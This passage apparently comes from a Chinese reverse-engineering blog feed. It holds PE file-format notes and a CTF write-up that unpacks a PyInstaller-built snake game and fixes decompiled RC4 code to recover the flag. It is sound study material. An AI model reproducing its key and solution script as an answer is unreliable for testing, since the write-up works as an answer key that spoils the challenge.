src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/pe/%20heads/%E6%89%A9%E5%B1%95PE%E5%A4%B4-32%E7%BB%93%E6%9E%84%E4%BD%93.png" alt="扩展PE头-32结构体"></p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/pe/%20heads/%E6%89%A9%E5%B1%95PE%E5%A4%B4%E7%BB%93%E6%9E%84%E4%BD%93-32-02.png" alt="扩展PE头结构体-32-02"></p><p>主要研究红色的部分</p><p><strong>Magic</strong>是用来标识当前程序是32&#x2F;64位，转换成两字节后 <strong>10B是标识32位，20B是标识64位</strong></p><p>BYTE MajorLinkerVersion,BYTE MinorLinkerVersion，存储链接器的版本，由链接器填写，不影响程序运行</p><p>DWORD SizeOfCode，DWORDSizeOfnitializedData，DWORDSizeO fUninitialize dData由编译器填写，不影响程序运行</p><p>&#x3D;&#x3D;<strong>Addre ssOEntrvPoint</strong>&#x3D;&#x3D;是程序入口，是**&#x3D;&#x3D;当前这个程序在哪里开始执行的&#x3D;&#x3D;**，要配合lmageBase（内存镜像基址）来看</p><p>&#x3D;&#x3D;<strong>lmageBase</strong>&#x3D;&#x3D;是内存镜像基址，由它决定&#x3D;&#x3D;<strong>程序在内存执行的时候在哪个地址展开</strong>&#x3D;&#x3D;</p><p><strong>&#x3D;&#x3D;（！！！展开不是执行！！！）&#x3D;&#x3D;</strong></p><p>实际的程序在内存的入口是&#x3D;&#x3D;<strong>lmageBase</strong>&#x3D;&#x3D; <strong>+</strong> &#x3D;&#x3D;<strong>Addre ssOEntrvPoint</strong>&#x3D;&#x3D;</p><p><strong>SectionAlignment. 内存对齐（看上个笔记把）</strong><br><strong>FileAlignment文件对齐（看上个笔记把）</strong></p><p>MajorOperatingSystemVersion:标识损作系统版本号 主版本号</p><p>MinorOperatingSyste mVersion;标识损作系统版本号 次版本号</p><p>MajorlmageVersion.PE文件自身的版本号</p><p>MinorlmageVersionPE文件自身的质本号</p><p>MajorSubsystemVersion运行所需子系统版本号</p><p>MinorSubsystemVersion:运行所需子系统版本号</p><p>Win32VersionValue;子系统质本的值，必须为0</p><p><strong>SizeOfimage.<strong>内存中整个PE文件展开的尺寸，可比实际的值大，必须是</strong>SectionAlignment整数倍</strong><br><strong>SizeOfHeaders</strong>所有头+节表按照文件对齐后的大小，否则加载会出错必须是<strong>FileAlignment整数倍</strong><br><strong>CheckSum（校验盒）</strong>校验和一些系统文件有要求,用来 判断文件是否被修改，两个字节两个字节相加，溢出不用在意，最后加上文件长度</p><p>Subsystem子系统驱动程序(1) 图形界面(2) 控制台、DLL(3)<br>DllCharacteristics文件特性 不是针对DLL文件的，是<strong>描述文件属性</strong></p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/pe/%20heads/DilCharacteristics.png" alt="DilCharacteristics"></p><p>查找方式与上面标准PE头的一样将16进制转换成2进制，2进制的每一位都有各自的含义</p><p>SizeOfStackReserve初始化时保留的栈大小<br>SizeOfStackCommit初始化时实际提交的大小<br>SizeOHeapReserve 始化时保留的雄大小<br>SizeOfHeapCommit初始化时实践提交的大小<br>LoaderFlags  调试相关<br>NumberOfRvaAndSizes  目录项数目</p><p>IMAGE DATA DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTERIES]</p><p>这是个结构体数组，长度是16个字节，有4个DWORD的成员</p><h2 id="节表"><a href="#节表" class="headerlink" title="节表"></a>节表</h2><p>每个节有40个字节</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/pe/%20heads/%E8%8A%82%E8%A1%A8%E7%BB%93%E6%9E%84%E8%AF%B4%E6%98%8E.png" alt="节表结构说明"></p><p>BYTE NamelIMAGE SIZEOF SHORT_NAME]8字节，当前节的名字，可更改，不影响程序的运行</p><p> <strong>VrtualSize</strong>当前这个节中<strong>没有对齐</strong>后的值，也可以说是当前节<strong>真实的值</strong>是多少</p><p> <strong>VirtualAddress</strong><strong>在内存中的偏移地址,加上ImageBase才是在内存中的真正地址</strong><br><strong>SizeOfRawData</strong>节在<strong>文件中</strong>对齐后的尺寸<br><strong>PointerToRawData</strong>节区在<strong>文件</strong>中的偏移</p><p>当有很大一部分<strong>初始化了的全局变量</strong>， &#x3D;&#x3D;<strong>VrtualSize</strong>值一定小于<strong>SizeOfRawData</strong>&#x3D;&#x3D;</p><p>当有很大一部分<strong>未初始化的全局变量</strong>，在<strong>文件中不给变量分配空间</strong>，但是展开到内存中时要给未初始化的变量初始化，&#x3D;&#x3D;<strong>VrtualSize</strong>会比<strong>SizeOfRawData</strong>大&#x3D;&#x3D;</p><p>这样会让内存很难办，于是内存想**&#x3D;&#x3D;谁大按照谁展开&#x3D;&#x3D;**</p><p><strong>Characteristics</strong>节的属性</p><p>把4字节的16进制转换成2进制后按照对应的位置来查找相关信息</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/pe/%20heads/%E8%8A%82%E8%A1%A8%E5%B1%9E%E6%80%A7%E8%A1%A8.png" alt="节表属性表"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>【RC4】【2024summer】Snack.exe（ver.鸿辉）</title>
      <link href="/2024/07/10/snack.exe/"/>
      <url>/2024/07/10/snack.exe/</url>
      
        <content type="html"><![CDATA[<h1 id="snack-exe"><a href="#snack-exe" class="headerlink" title="snack.exe"></a>snack.exe</h1><hr><h3 id="！！！rc4的加解密算法相同！！！"><a href="#！！！rc4的加解密算法相同！！！" class="headerlink" title="！！！rc4的加解密算法相同！！！"></a>！！！rc4的加解密算法相同！！！</h3><hr><p>查壳无壳，用ida查看string发现有字符</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/24summer/snack01.png" alt="snack01"></p><p>说明是用python写完打包的程序</p><p>使用pyinstxtractor和uncompyle6进行解包和反编译</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Visit https://www.lddgo.net/string/pyc-compile-decompile for more information</span></span><br><span class="line"><span class="comment"># Version : Python 3.8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pygame</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> key</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">key</span>):</span><br><span class="line">    key_length = <span class="built_in">len</span>(key)</span><br><span class="line">    S = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + S[i] + key[i % key_length]) % <span class="number">256</span></span><br><span class="line">        S[i] = S[j]</span><br><span class="line">        S[j] = S[i]</span><br><span class="line">    <span class="keyword">return</span> S</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_key_stream</span>(<span class="params">S, length</span>):</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    key_stream = []</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">        S[i] = S[j]</span><br><span class="line">        S[j] = S[i]</span><br><span class="line">        key_stream.append(S[(S[i] + S[j]) % <span class="number">256</span>])</span><br><span class="line">    <span class="keyword">return</span> key_stream</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">data, key</span>):</span><br><span class="line">    S = initialize(key)</span><br><span class="line">    key_stream = generate_key_stream(S, <span class="built_in">len</span>(data))</span><br><span class="line">    decrypted_data = <span class="literal">None</span>((<span class="keyword">lambda</span> <span class="number">.0</span> = <span class="literal">None</span>: [ i ^ data[i] ^ key_stream[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">.0</span> ])(<span class="built_in">range</span>(<span class="built_in">len</span>(data))))</span><br><span class="line">    <span class="keyword">return</span> decrypted_data</span><br><span class="line"></span><br><span class="line">pygame.init()</span><br><span class="line">WINDOW_WIDTH = <span class="number">800</span></span><br><span class="line">WINDOW_HEIGHT = <span class="number">600</span></span><br><span class="line">SNAKE_SIZE = <span class="number">20</span></span><br><span class="line">SNAKE_SPEED = <span class="number">20</span></span><br><span class="line">WHITE = (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>)</span><br><span class="line">BLACK = (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">RED = (<span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">window = pygame.display.set_mode((WINDOW_WIDTH, WINDOW_HEIGHT))</span><br><span class="line">pygame.display.set_caption(<span class="string">&#x27;贪吃蛇&#x27;</span>)</span><br><span class="line">font = pygame.font.Font(<span class="literal">None</span>, <span class="number">36</span>)</span><br><span class="line">snake = [</span><br><span class="line">    (<span class="number">200</span>, <span class="number">200</span>),</span><br><span class="line">    (<span class="number">210</span>, <span class="number">200</span>),</span><br><span class="line">    (<span class="number">220</span>, <span class="number">200</span>)]</span><br><span class="line">snake_direction = (SNAKE_SPEED, <span class="number">0</span>)</span><br><span class="line">food = ((random.randint(<span class="number">0</span>, WINDOW_WIDTH - SNAKE_SIZE) // SNAKE_SIZE) * SNAKE_SIZE, (random.randint(<span class="number">0</span>, WINDOW_HEIGHT - SNAKE_SIZE) // SNAKE_SIZE) * SNAKE_SIZE)</span><br><span class="line">key_bytes = <span class="built_in">bytes</span>((<span class="keyword">lambda</span> <span class="number">.0</span>: [ <span class="built_in">ord</span>(char) <span class="keyword">for</span> char <span class="keyword">in</span> <span class="number">.0</span> ])(key.xor_key))</span><br><span class="line">data = [</span><br><span class="line">    <span class="number">101</span>,<span class="number">97</span>,<span class="number">39</span>,<span class="number">125</span>,<span class="number">218</span>,</span><br><span class="line">    <span class="number">172</span>,<span class="number">205</span>,<span class="number">3</span>,<span class="number">235</span>,<span class="number">195</span>,</span><br><span class="line">    <span class="number">72</span>,<span class="number">125</span>,<span class="number">89</span>, <span class="number">130</span>,<span class="number">103</span>,</span><br><span class="line">    <span class="number">213</span>,<span class="number">120</span>,<span class="number">227</span>,<span class="number">193</span>,<span class="number">67</span>,</span><br><span class="line">    <span class="number">174</span>,<span class="number">71</span>,<span class="number">162</span>,<span class="number">248</span>,<span class="number">244</span>,</span><br><span class="line">    <span class="number">12</span>,<span class="number">238</span>,<span class="number">92</span>,<span class="number">160</span>,<span class="number">203</span>,<span class="number">185</span>,<span class="number">155</span>]</span><br><span class="line">decrypted_data = decrypt(<span class="built_in">bytes</span>(data), key_bytes)</span><br><span class="line">running = <span class="literal">True</span></span><br><span class="line"><span class="keyword">if</span> running:</span><br><span class="line">    window.fill(BLACK)</span><br><span class="line">    <span class="keyword">for</span> event <span class="keyword">in</span> pygame.event.get():</span><br><span class="line">        <span class="keyword">if</span> event.<span class="built_in">type</span> == pygame.QUIT:</span><br><span class="line">            running = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">elif</span> event.<span class="built_in">type</span> == pygame.KEYDOWN <span class="keyword">or</span> event.key == pygame.K_UP:</span><br><span class="line">            snake_direction = (<span class="number">0</span>, -SNAKE_SPEED)</span><br><span class="line">        <span class="keyword">elif</span> event.key == pygame.K_DOWN:</span><br><span class="line">            snake_direction = (<span class="number">0</span>, SNAKE_SPEED)</span><br><span class="line">        <span class="keyword">elif</span> event.key == pygame.K_LEFT:</span><br><span class="line">            snake_direction = (-SNAKE_SPEED, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">elif</span> event.key == pygame.K_RIGHT:</span><br><span class="line">            snake_direction = (SNAKE_SPEED, <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">            snake_head = (snake[<span class="number">0</span>][<span class="number">0</span>] + snake_direction[<span class="number">0</span>], snake[<span class="number">0</span>][<span class="number">1</span>] + snake_direction[<span class="number">1</span>])</span><br><span class="line">            snake.insert(<span class="number">0</span>, snake_head)</span><br><span class="line">            snake.pop()</span><br><span class="line">            <span class="keyword">if</span> snake[<span class="number">0</span>] == food:</span><br><span class="line">                food = ((random.randint(<span class="number">0</span>, WINDOW_WIDTH - SNAKE_SIZE) // SNAKE_SIZE) * SNAKE_SIZE, (random.randint(<span class="number">0</span>, WINDOW_HEIGHT - SNAKE_SIZE) // SNAKE_SIZE) * SNAKE_SIZE)</span><br><span class="line">                snake.append(snake[-<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> snake[<span class="number">0</span>][<span class="number">0</span>] &lt; <span class="number">0</span> <span class="keyword">and</span> snake[<span class="number">0</span>][<span class="number">0</span>] &gt;= WINDOW_WIDTH <span class="keyword">and</span> snake[<span class="number">0</span>][<span class="number">1</span>] &lt; <span class="number">0</span> <span class="keyword">and</span> snake[<span class="number">0</span>][<span class="number">1</span>] &gt;= WINDOW_HEIGHT <span class="keyword">or</span> snake[<span class="number">0</span>] <span class="keyword">in</span> snake[<span class="number">1</span>:]:</span><br><span class="line">        running = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> segment <span class="keyword">in</span> snake:</span><br><span class="line">        pygame.draw.rect(window, WHITE, (segment[<span class="number">0</span>], segment[<span class="number">1</span>], SNAKE_SIZE, SNAKE_SIZE))</span><br><span class="line">    pygame.draw.rect(window, RED, (food[<span class="number">0</span>], food[<span class="number">1</span>], SNAKE_SIZE, SNAKE_SIZE))</span><br><span class="line">    score_text = font.render(<span class="string">f&#x27;&#x27;&#x27;Score: <span class="subst">&#123;<span class="built_in">len</span>(snake)&#125;</span>&#x27;&#x27;&#x27;</span>, <span class="literal">True</span>, WHITE)</span><br><span class="line">    speed_text = font.render(<span class="string">f&#x27;&#x27;&#x27;Speed: <span class="subst">&#123;SNAKE_SPEED&#125;</span>&#x27;&#x27;&#x27;</span>, <span class="literal">True</span>, WHITE)</span><br><span class="line">    window.blit(score_text, (<span class="number">10</span>, <span class="number">10</span>))</span><br><span class="line">    window.blit(speed_text, (<span class="number">10</span>, <span class="number">40</span>))</span><br><span class="line">    score = <span class="built_in">len</span>(snake)</span><br><span class="line">    <span class="keyword">if</span> score &gt;= <span class="number">9999</span>:</span><br><span class="line">        flag_text = font.render(<span class="string">&#x27;Flag: &#x27;</span> + decrypted_data.decode(), <span class="literal">True</span>, WHITE)</span><br><span class="line">        window.blit(flag_text, (<span class="number">10</span>, <span class="number">70</span>))</span><br><span class="line">    pygame.display.upate()</span><br><span class="line">    pygame.time.Clock().tick(<span class="number">10</span>)</span><br><span class="line">    <span class="keyword">continue</span></span><br><span class="line">pygame.quit()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(decrypted_data.decode())</span><br></pre></td></tr></table></figure><p>前三个函数体是rc4加密</p><p>将贪吃蛇相关的代码删掉和将key.pyc逆向</p><p>后为下列代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">xor_key = <span class="string">&#x27;V3rY_v3Ry_Ez&#x27;</span>  <span class="comment">#这是key的内容</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">key</span>):</span><br><span class="line">    key_length = <span class="built_in">len</span>(key)</span><br><span class="line">    S = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + S[i] + key[i % key_length]) % <span class="number">256</span></span><br><span class="line">        S[i] = S[j]</span><br><span class="line">        S[j] = S[i]</span><br><span class="line">      </span><br><span class="line">    <span class="keyword">return</span> S</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_key_stream</span>(<span class="params">S, length</span>):</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    key_stream = []</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">        S[i] = S[j]</span><br><span class="line">        S[j] = S[i]</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        key_stream.append(S[(S[i] + S[j]) % <span class="number">256</span>])</span><br><span class="line">    <span class="keyword">return</span> key_stream</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">data, key</span>):</span><br><span class="line">    S = initialize(key)</span><br><span class="line">    key_stream = generate_key_stream(S, <span class="built_in">len</span>(data))</span><br><span class="line">    decrypted_data = <span class="built_in">bytes</span>([ i ^ data[i] ^ key_stream[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data))])</span><br><span class="line">    <span class="keyword">return</span> decrypted_data</span><br><span class="line"></span><br><span class="line">key_bytes = <span class="built_in">bytes</span>(<span class="built_in">ord</span>(char) <span class="keyword">for</span> char <span class="keyword">in</span> (xor_key))</span><br><span class="line"><span class="built_in">print</span>(key_bytes)</span><br><span class="line">data = [</span><br><span class="line">    <span class="number">101</span>,<span class="number">97</span>,<span class="number">39</span>,<span class="number">125</span>,<span class="number">218</span>,</span><br><span class="line">    <span class="number">172</span>,<span class="number">205</span>,<span class="number">3</span>,<span class="number">235</span>,<span class="number">195</span>,</span><br><span class="line">    <span class="number">72</span>,<span class="number">125</span>,<span class="number">89</span>, <span class="number">130</span>,<span class="number">103</span>,</span><br><span class="line">    <span class="number">213</span>,<span class="number">120</span>,<span class="number">227</span>,<span class="number">193</span>,<span class="number">67</span>,</span><br><span class="line">    <span class="number">174</span>,<span class="number">71</span>,<span class="number">162</span>,<span class="number">248</span>,<span class="number">244</span>,</span><br><span class="line">    <span class="number">12</span>,<span class="number">238</span>,<span class="number">92</span>,<span class="number">160</span>,<span class="number">203</span>,<span class="number">185</span>,<span class="number">155</span>]</span><br><span class="line"></span><br><span class="line">decrypted_data = decrypt(<span class="built_in">bytes</span>(data), key_bytes)</span><br><span class="line"><span class="comment"># flag_text = (&#x27;Flag: &#x27; + chr(decrypted_data))</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(decrypted_data)</span><br></pre></td></tr></table></figure><p>但是这段反编译代码有问题</p><p>rc4的初始化是将 s[i]与j[i]交换位置</p><p>而反编译出来的代码**S[i] &#x3D; S[j]  S[j] &#x3D; S[i]**是单纯的赋值并没有交换顺序</p><p>所以正确脚本是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">xor_key = <span class="string">&#x27;V3rY_v3Ry_Ez&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">key</span>):</span><br><span class="line">    key_length = <span class="built_in">len</span>(key)</span><br><span class="line">    S = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + S[i] + key[i % key_length]) % <span class="number">256</span></span><br><span class="line">        <span class="comment"># S[i] = S[j]</span></span><br><span class="line">        <span class="comment"># S[j] = S[i]</span></span><br><span class="line">        S[i],S[j] = S[j],S[i]</span><br><span class="line">    <span class="keyword">return</span> S</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_key_stream</span>(<span class="params">S, length</span>):</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    key_stream = []</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">        <span class="comment"># S[i] = S[j]</span></span><br><span class="line">        <span class="comment"># S[j] = S[i]</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line"></span><br><span class="line">        key_stream.append(S[(S[i] + S[j]) % <span class="number">256</span>])</span><br><span class="line">    <span class="keyword">return</span> key_stream</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">data, key</span>):</span><br><span class="line">    S = initialize(key)</span><br><span class="line">    key_stream = generate_key_stream(S, <span class="built_in">len</span>(data))</span><br><span class="line">    decrypted_data = <span class="built_in">bytes</span>([ i ^ data[i] ^ key_stream[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data))])</span><br><span class="line">    <span class="keyword">return</span> decrypted_data</span><br><span class="line"></span><br><span class="line">key_bytes = <span class="built_in">bytes</span>(<span class="built_in">ord</span>(char) <span class="keyword">for</span> char <span class="keyword">in</span> (xor_key))</span><br><span class="line"><span class="comment"># key_bytes = [86,51,114,89,95,118,51,82,121,95,69,122]</span></span><br><span class="line"><span class="built_in">print</span>(key_bytes)</span><br><span class="line">data = [</span><br><span class="line">   <span class="number">101</span>,<span class="number">97</span>,<span class="number">39</span>,<span class="number">125</span>,<span class="number">218</span>,</span><br><span class="line">    <span class="number">172</span>,<span class="number">205</span>,<span class="number">3</span>,<span class="number">235</span>,<span class="number">195</span>,</span><br><span class="line">    <span class="number">72</span>,<span class="number">125</span>,<span class="number">89</span>, <span class="number">130</span>,<span class="number">103</span>,</span><br><span class="line">    <span class="number">213</span>,<span class="number">120</span>,<span class="number">227</span>,<span class="number">193</span>,<span class="number">67</span>,</span><br><span class="line">    <span class="number">174</span>,<span class="number">71</span>,<span class="number">162</span>,<span class="number">248</span>,<span class="number">244</span>,</span><br><span class="line">    <span class="number">12</span>,<span class="number">238</span>,<span class="number">92</span>,<span class="number">160</span>,<span class="number">203</span>,<span class="number">185</span>,<span class="number">155</span>]</span><br><span class="line">decrypted_data = decrypt(<span class="built_in">bytes</span>(data), key_bytes)</span><br><span class="line"><span class="comment"># flag_text = (&#x27;Flag: &#x27; + chr(decrypted_data))</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(decrypted_data)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>【PE】PE结构的总概与文件格式特征</title>
      <link href="/2024/07/09/PE%E7%BB%93%E6%9E%84/"/>
      <url>/2024/07/09/PE%E7%BB%93%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<h1 id="PE-结构"><a href="#PE-结构" class="headerlink" title="PE 结构"></a>PE 结构</h1><h4 id="总概"><a href="#总概" class="headerlink" title="总概"></a>总概</h4><p>可执行文件：可以由操作系统进行加载执行的文件。</p><p>格式：Windows：PE Linux：ELF</p><p>领域涉及：</p><p>​ （1）病毒与反病毒</p><p>​ （2）外挂与反外挂</p><p>​ （3）加壳与脱壳</p><p>​ （4）无源码修改功能·软件汉化等等</p><h4 id="PE-文件特征"><a href="#PE-文件特征" class="headerlink" title="PE 文件特征"></a>PE 文件特征</h4><p>​ <strong>PE 指纹（不要光看后缀名！！！）</strong></p><p>​ <strong>先看前两个字节是不是 MZ</strong></p><p>​ <strong>再看 3C 位置的 16 进制地址</strong></p><p>​ <strong>最后看 3C 所指地址处的前两个字节是不是 PE</strong></p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/pe/pe%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E7%89%B9%E5%BE%81.png" alt="pe文件格式特征"></p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/pe/pe%E7%BB%93%E6%9E%84%E8%A1%A8.png" alt="pe结构表"></p><h5 id="DOS-部分"><a href="#DOS-部分" class="headerlink" title="DOS 部分"></a>DOS 部分</h5><p>IMAGE_DOS_HEADER 64 字节</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/pe/pe03.png" alt="pe03"></p><p>DOS 块 MZ 块末尾与 PE 头中间的部分</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/pe/pe04.png" alt="pe04"></p><h5 id="PE-文件头部分"><a href="#PE-文件头部分" class="headerlink" title="PE 文件头部分"></a>PE 文件头部分</h5><p>PE 文件头标志+PE 文件表头+PE 文件头可选部分</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/pe/pe%E5%A4%B4.png" alt="pe头"></p><h6 id="PE-文件头标志（DWORD-Signature）"><a href="#PE-文件头标志（DWORD-Signature）" class="headerlink" title="PE 文件头标志（DWORD Signature）"></a>PE 文件头标志（DWORD Signature）</h6><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/pe/pe%E9%83%A8%E5%88%86-pe%E6%A0%87%E8%AE%B0.png" alt="pe部分-pe标记"></p><h6 id="PE-文件表头（标准-PE-头）-20-字节"><a href="#PE-文件表头（标准-PE-头）-20-字节" class="headerlink" title="PE 文件表头（标准 PE 头） 20 字节"></a>PE 文件表头（标准 PE 头） 20 字节</h6><p>（IMAGE_FILE_HEADER FileHeader)</p><p><img 